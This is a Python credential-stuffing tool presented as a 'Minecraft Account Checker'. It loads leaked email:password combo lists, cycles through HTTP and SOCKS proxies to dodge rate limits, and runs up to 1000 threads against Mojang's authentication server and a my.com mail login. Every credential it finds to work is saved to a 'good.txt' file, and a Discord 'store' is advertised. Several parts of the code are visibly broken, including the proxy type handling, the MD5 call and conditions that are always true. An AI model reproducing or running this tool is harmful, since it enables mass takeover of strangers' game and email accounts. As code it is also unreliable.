# © Design is Copyright by EclipsesDev
# Beautiful Designed Minecraft Account Checker

from logging import getLogRecordFactory
import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path, tkinter
from colorama import Fore, init
from re import search
import datetime
from tkinter import filedialog, messagebox
e = datetime.datetime.now()

current_date = e.strftime("%Y-%m-%d-%H-%M-%S")
author = "EclipsesDev © 2022-2026"

root = tkinter.Tk()
root.withdraw()

if not os.path.exists("results"):
    os.makedirs("results/")
if not os.path.exists('results/minecraft'):
    os.makedirs('results/minecraft')
if not os.path.exists('results/mail_access'):
    os.makedirs('results/mail_access')
if not os.path.exists('results/mail_access/{}'.format(current_date)):
    os.makedirs('results/mail_access/{}'.format(current_date))
if not os.path.exists('results/minecraft/{}'.format(current_date)):
    os.makedirs('results/minecraft/{}'.format(current_date))

init()
blue, red, white, green, magenta, cyan = Fore.BLUE, Fore.RED, Fore.WHITE, Fore.GREEN, Fore.MAGENTA, Fore.CYAN
global emails, passwords
emails = []
passwords = []
proxylist = []
good, bad, cpm1, cpm2, checked, banned, errors = 0, 0, 0, 0, 0, 0, 0
messages = ["Designed to look like premium Checker :D"]
logo = f"""
 {green} █████╗ █████╗ ███╗   ███╗██████╗  ╔█████╗    █████╗ ██╗  ██╗███████╗ █████╗ ██╗  ██╗███████╗██████╗ {cyan}
 {green}██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗  ██╔══██╗██║  ██║██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{cyan} 
 {green}██║  ╚═╝██║  ██║██╔████╔██║██████╦╝██║  ██║  ██║  ╚═╝███████║█████╗  ██║  ╚═╝█████═╝ █████╗  ██████╔╝{cyan}
 {green}██║  ██╗██║  ██║██║╚██╔╝██║██╔══██╗██║  ██║  ██║  ██╗██╔══██║██╔══╝  ██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗{cyan}
 {green}╚█████╔╝╚█████╔╝██║ ╚═╝ ██║██████╦╝╚█████╔╝  ╚█████╔╝██║  ██║███████╗╚█████╔╝██║ ╚██╗███████╗██║  ██║{cyan}
 {green} ╚════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝  ╚════╝    ╚════╝ ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{cyan}
                                                                                                             """

def load_combos():
    global emails, passwords
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    input("  Press ENTER to select combos..")
    fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameCombo is None:
        print()
        print("  Please select valid combo file..")
        time.sleep(2)
        start()
    else:
        try:
            with open(fileNameCombo.name, 'r+', encoding='utf-8') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        email = line.split(":")[0].replace('\n', '')
                        password = line.split(":")[1].replace('\n', '')
                        emails.append(email)
                        passwords.append(password)
                    except:
                        pass
            print("  Loaded [{}] combos lines..".format(len(emails)))
            time.sleep(2)
        except Exception:
            print("  Your combo file is probably corrupted, please try again..")
            time.sleep(2)
            start()
def load_proxies():
    global proxylist
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    input("  Press ENTER to select proxies..")
    fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file',
                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print()
        print("  Please select valid proxy file..")
        time.sleep(2)
        start()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except:
                        pass
            print("  Loaded [{}] proxies lines..".format(len(proxylist)))
            time.sleep(2)
        except Exception:
            print("  Your proxy file is probably corrupted, please try again..")




def main():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    print(Fore.RED+"  Pick option [1], [2], [3], [4], [5]"+ Fore.LIGHTGREEN_EX) 
    print("\n  [1] Minecraft Checker\n  [2] Mail Access Checker\n  [3] Discord Store\n  [4] Credits\n  [5] Quit")
    try:
        question = int(input("  "))
    except Exception:
        print("Invalid input..")
        time.sleep(2)
        main()
    if question == 1:
        start()
    elif question == 2:
        start_mail()
    elif question == 3:
        webbrowser.open_new("https://discord.gg/dre2PD23Qd")
        main()
    elif question == 4:
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
        print("\n" + logo + "\n")
        print(f"  Combo Checker - By {author} - \"{random.choice(messages)}\"")
        print()
        print(f"  [+] Developed by Unknown\n  [+] Designed by {author}")
        print()
        input("  Press ENTER to get on menu..")
        main()
    elif question == 5:
        print("  We are closing..")
        time.sleep(2)
        sys.exit()
    else:
        print("  Invalid input..")
        time.sleep(2)
        main()

def screen_mc():
    global checked, bad, good, cpm1, cpm2, banned, errors
    cpm2 = cpm1
    cpm1 = 0
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed By {author} \"{random.choice(messages)}\"")
    print()
    print("  Hol up lemme check the Minecraft Accounts")
    print()
    print(  Fore.LIGHTYELLOW_EX+"  Checked: [{}/{}]".format(checked, len(emails)))
    print(  Fore.GREEN+"  Hits: [{}]".format(good))
    print(  Fore.RED+"  Bad: [{}]".format(bad))
    print(  Fore.LIGHTRED_EX+"  Banned: [{}]".format(banned))
    print(  Fore.LIGHTBLUE_EX+"  Cpm: [{}]".format(cpm2*60))
    print(  Fore.RED+"  Errors: [{}]".format(errors))
    time.sleep(1)
    threading.Thread(target=screen_mc, args=()).start()

def screen_mail():
    global checked, bad, good, cpm1, cpm2, banned, errors
    cpm2 = cpm1
    cpm1 = 0
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    print("  Hol up lemme check the Minecraft Accounts")
    print()
    print(  Fore.LIGHTYELLOW_EX+"  Checked: [{}/{}]".format(checked, len(emails)))
    print(  Fore.GREEN+"  Hits: [{}]".format(good))
    print(  Fore.RED+"  Bad: [{}]".format(bad))
    print(  Fore.LIGHTRED_EX+"  Banned: [{}]".format(banned))
    print(  Fore.LIGHTBLUE_EX+"  Cpm: [{}]".format(cpm2*60))
    print(  Fore.RED+"  Errors: [{}]".format(errors))
    time.sleep(1)
    threading.Thread(target=screen_mail, args=()).start()

def check_mail(email, password, proxylist, proxy_type):
    global checked, bad, good, cpm1, cpm2, banned, errors
    try:
        sess = requests.Session()
        if proxy_type == "https":
            proxy_to_use = random.choice(proxylist)
            try: 
                x = proxy_to_use.split(":")
                if len(x) == 2:
                    proxies = {'http': f'http://{proxy_to_use}', 'https': f'https://{proxy_to_use}'}
                    sess.proxies = proxies
                elif len(x) == 4:
                    proxies = {'http': f'http://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}', 'https': f'https://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                    sess.proxies = proxies
                else:
                    pass
            except Exception:
                pass
        elif proxy_type == "socks4":
            try: 
                x = proxy_to_use.split(":")
                if len(x) == 2:
                    proxies = {'http': f'socks4://{proxy_to_use}'}
                    sess.proxies = proxies
                elif len(x) == 4:
                    proxies = {'http': f'socks4://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                    sess.proxies = proxies
                else:
                    pass
            except Exception:
                pass
        elif proxy_type == "socks5":
            try: 
                x = proxy_to_use.split(":")
                if len(x) == 2:
                    proxies = {'http': f'socks5://{proxy_to_use}'}
                    sess.proxies = proxies
                elif len(x) == 4:
                    proxies = {'http': f'socks5://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                    sess.proxies = proxies
                else:
                    pass
            except Exception:
                pass
        else:
            pass
        url1 = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(email, password) 
        headers = {
            "User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"
        }
        f = sess.get(url1, headers=headers)
        if "Ok=1" in f.text:
            good+=1
            checked+=1
            cpm1+=1
            open('results/mail_access/{}/good.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        elif "Ok=0" in f.text:
            bad+=1
            checked+=1
            cpm1+=1
            open('results/mail_access/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        else:
            banned+=1
            checked+=1
            cpm1+=1
            open('results/mail_access/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
    except Exception:
        errors+=1

def check(email, password, proxylist, proxy_type):
    global checked, bad, good, cpm1, cpm2, banned, errors
    try:
        sess = requests.Session()
        if proxy_type == "https":
            proxy_to_use = random.choice(proxylist)
            try: 
                x = proxy_to_use.split(":")
                if len(x) == 2:
                    proxies = {'http': f'http://{proxy_to_use}', 'https': f'https://{proxy_to_use}'}
                    sess.proxies = proxies
                elif len(x) == 4:
                    proxies = {'http': f'http://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}', 'https': f'https://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                    sess.proxies = proxies
                else:
                    pass
            except Exception:
                pass
        elif proxy_type == "socks4":
            try: 
                x = proxy_to_use.split(":")
                if len(x) == 2:
                    proxies = {'http': f'socks4://{proxy_to_use}'}
                    sess.proxies = proxies
                elif len(x) == 4:
                    proxies = {'http': f'socks4://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                    sess.proxies = proxies
                else:
                    pass
            except Exception:
                pass
        elif proxy_type == "socks5":
            try: 
                x = proxy_to_use.split(":")
                if len(x) == 2:
                    proxies = {'http': f'socks5://{proxy_to_use}'}
                    sess.proxies = proxies
                elif len(x) == 4:
                    proxies = {'http': f'socks5://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                    sess.proxies = proxies
                else:
                    pass
            except Exception:
                pass
        else:
            pass
        url1 = "https://api.mojang.com/profiles/minecraft" 
        content = "[\"{}\"]".format(email)
        headers = {
            "Content-Type":"application/json", 
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
            "Pragma":"no-cache",
            "Accept":"*/*" 
        }
        f = sess.post(url1, data=content, headers=headers)
        if "legacy\":true" in f.text:
            cpm1+=1
            result = hashlib.md5(b'{}'.format(email))
            api = "https://authserver.mojang.com/authenticate"
            data = {"agent":{"name": "Minecraft", "version": 1}, "clientToken": result,"password": password,"requestUser": "true", "username": email}
            headers = {
                "Content-Type":"application/json", 
                "User-Agent": "MinecraftLauncher/1.0", 
                "Pragma": "no-cache", 
                "Accept": "*/*" 
            }
            r = sess.post(api, json=data, headers=headers)
            if "errorMessage\":\"Invalid credentials. Invalid username or password." in r.text:
                bad+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            elif "accessToken" or "passwordChangedAt" in r.text:
                good+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/good.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            else:
                banned+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        elif "[]" or "legacy\":false" or "id" in f.text:
            bad+=1
            checked+=1
            cpm1+=1
            open('results/minecraft/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        elif "The client has sent too many requests within a certain amount of time" in f.text:
            banned+=1
            checked+=1
            cpm1+=1
            open('results/minecraft/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        elif "legacy" not in f.text:
            bad+=1
            checked+=1
            cpm1+=1
            open('results/minecraft/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        else:
            banned+=1
            checked+=1
            cpm1+=1
            open('results/minecraft/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
    except Exception:
        errors+=1
def start_mail():
    global emails, passwords, proxylist
    emails.clear()
    passwords.clear()
    proxylist.clear()
    load_combos()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    print("  What type of proxies you want to use?")
    print("\n  [1] http/s\n  [2] socks4\n  [3] socks5")
    try:
        proxy_type = int(input("  "))
    except Exception:
        print("  Invalid input..")
        time.sleep(2)
        start()
    if proxy_type == 1:
        proxy_new = "https"
    elif proxy_type == 2:
        proxy_new = "socks4"
    elif proxy_type == 3:
        proxy_new = "socks5"
    else:
        print("  Invalid input..")
        time.sleep(2)
        start()
    load_proxies()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} - \"{random.choice(messages)}\"")
    print()
    print("  How many threads do you want to use? [Max 1000]")
    try:
        threads = int(input("  "))
    except Exception:
        print("  Invalid input..")
        time.sleep(2)
        start()
    if threads > 1000:
        print("  Maximum thread value is {}1000{}".format(blue, blue))
        time.sleep(2)
        start()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} - \"{random.choice(messages)}\"")
    print()
    print("  Running checker..")
    time.sleep(1.5)
    screen_mail()
    num = 0
    while 1:
        if threading.active_count() < int(threads):
            if len(emails) > num:
                try:
                    threading.Thread(target=check_mail, args=(emails[num], passwords[num], proxylist, proxy_type,)).start()
                    num+=1
                except:
                    print("Yessir Checked all.")
                    time.sleep(5)
                    print()
                    input("Press any key to close checker.")

def start():
    global emails, passwords, proxylist
    emails.clear()
    passwords.clear()
    proxylist.clear()
    load_combos()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    print("  What type of proxies you want to use?")
    print("\n  [1] http/s\n  [2] socks4\n  [3] socks5")
    try:
        proxy_type = int(input("  "))
    except Exception:
        print("  Invalid input..")
        time.sleep(2)
        start()
    if proxy_type == 1:
        proxy_new = "https"
    elif proxy_type == 2:
        proxy_new = "socks4"
    elif proxy_type == 3:
        proxy_new = "socks5"
    else:
        print("  Invalid input..")
        time.sleep(2)
        start()
    load_proxies()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    print("  How many threads do you want to use? [Max 1000]")
    try:
        threads = int(input("  "))
    except Exception:
        print("  Invalid input..")
        time.sleep(2)
        start()
    if threads > 1000:
        print("  Maximum thread value is {}1000{}".format(red, red))
        time.sleep(2)
        start()
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Combo Checker - By {author}")
    print("\n" + logo + "\n")
    print(f"  Designed by {author} \"{random.choice(messages)}\"")
    print()
    print("  Loading checker..")
    time.sleep(1.5)
    screen_mc()
    num = 0
    while 1:
        if threading.active_count() < int(threads):
            if len(emails) > num:
                try:
                    threading.Thread(target=check, args=(emails[num], passwords[num], proxylist, proxy_type,)).start()
                    num+=1
                except:
                    print("SuChecked all.")
                    time.sleep(5)
                    print()
                    input("Press any key to close combo checker.")


main()
